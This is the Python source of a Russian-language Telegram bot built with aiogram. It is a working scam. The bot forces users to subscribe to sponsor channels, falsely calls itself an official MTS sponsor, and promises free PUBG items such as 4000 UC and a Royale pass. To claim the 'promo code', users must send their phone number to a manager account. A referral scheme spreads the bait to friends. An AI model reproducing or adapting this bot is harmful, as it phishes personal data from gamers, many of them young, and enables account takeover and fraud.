from loader import dp, bot
from aiogram.dispatcher.filters.builtin import CommandStart
from aiogram.dispatcher import FSMContext
from aiogram import types

from data import db, config
from keyboards.inline import get_sub_menu_keyboard, get_get_menu_keyboard, get_invite_menu_keyboard
from keyboards.default import get_menu_keyboard
from filters import IsUserMessage

@dp.message_handler(CommandStart(), state='*')
@dp.message_handler(text='ℹ️ Главное меню', state='*')
async def bot_start(message: types.Message, state:FSMContext):
    await state.finish()

    user = await db.get_user(message.from_user.id)
    if not user:
        args = message.get_args()
        await db.create_user(message.from_user.id, message.from_user.first_name)
        ref = args if args else None
        if ref:
            await db.add_user_ref(message.from_user.id, ref)

    sponsors = await db.get_all_sponsors()

    if sponsors:
        for sponsor in sponsors:
            if sponsor[0] == 0:
                continue

            user_channel_status = await bot.get_chat_member(chat_id=sponsor[0], user_id=message.from_user.id)
            if user_channel_status["status"] == 'left':
                return await message.answer(
                    f'''👋 Здравствуйте, {message.from_user.first_name}! Рады тебя видеть в секретном боте доступ к которому можно получить только подписавшись на секретный канал!

*Официальный спонсор МТС!

Для активации бота необходимо подписаться на наш канал перейдя по кнопке ниже! 👇''', reply_markup=get_sub_menu_keyboard(sponsors)
                )
    else:
        return await message.answer('Добавьте спонсоров в админке!')

    await get_menu(message, state)

# Проверка подписки
@dp.callback_query_handler( text='check_sub', state='*')
async def check_sub(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await call.answer('DONE')
    await call.message.delete()

    sponsors = await db.get_all_sponsors()
    
    for sponsor in sponsors:
        user_channel_status = await bot.get_chat_member(chat_id=sponsor[0], user_id=call.from_user.id)
        if user_channel_status["status"] == 'left':
            return await call.message.answer('Вы не подписались на группу!', reply_markup=get_sub_menu_keyboard(sponsors))
    
    await get_menu(call, state)

# Меню
@dp.callback_query_handler(text='menu', state='*')
async def get_menu(call: types.CallbackQuery, state: FSMContext):
    await state.finish()

    user = await db.get_user(call.from_user.id)

    if type(call) == types.CallbackQuery:
        await call.message.answer('''🎁 Супер! Теперь выбери ниже какой подарок ты хочешь получить бесплатно?''', reply_markup=get_menu_keyboard(str(user[0])))
    else:
        await call.answer('🎁 Супер! Теперь выбери ниже какой подарок ты хочешь получить бесплатно?', reply_markup=get_menu_keyboard(str(user[0])))

@dp.message_handler(IsUserMessage(), text='4000 UC', state='*')
@dp.message_handler(IsUserMessage(), text='Metro royale pass', state='*')
@dp.message_handler(IsUserMessage(), text='X-suit collection', state='*')
async def products(message: types.Message, state:FSMContext):
    await state.finish()

    user = await db.get_user(message.from_user.id)
    if user[3]:
        await db.add_ref(user[3])
        await db.delete_user_ref(message.from_user.id)

    photo = message.text.replace('"', '')
    await message.answer_photo(open(f'src/{photo}.jpg', 'rb'),
        f'✅ Мы тебя поздравляем! Чтобы забрать промокод на "{message.text}" тебе всего лишь нужно подтвердить что ты не робот, а реальный человек.\n\n'
        'Для этого тебе нужно написать СВОЙ НОМЕР ТЕЛЕФОНА менеджеру и забрать ПРОМОКОД!\n\n'
        f'❗️❗️ПИШИ ЕМУ СВОЙ НОМЕР ТЕЛЕФОНА - @{config.manager} И ЗАБИРАЙ ПРОМОКОД НА "{message.text}"!\n\n'
        '🎁Внимание, вы должны просто написать свой номер телефона первым сообщением и ждать ответа, больше ничего.', reply_markup=get_get_menu_keyboard()
    )

@dp.callback_query_handler(text='invite', state='*')
async def invite(call: types.CallbackQuery, state: FSMContext):
    await call.answer('DONE')

    await call.message.answer(
        '🎁 Если ты уже получил свой промокод! То ты можешь получить дополнительно 1000UC за каждого друга кто присоединится в этот бот и заберёт свой промокод!\n\n'
        '❗️ Просто нажми на кнопку и отправляй друзьям!\n\n'
        f'🧑‍💻 После того как все сделал, отправляй свой номер +7 нашему менеджеру! @{config.manager}', reply_markup=get_invite_menu_keyboard())

@dp.callback_query_handler(text='promo', state='*')
async def promo(call: types.CallbackQuery, state: FSMContext):
    await call.answer('DONE')

    await call.message.answer(f'Менеджер: @{config.manager}')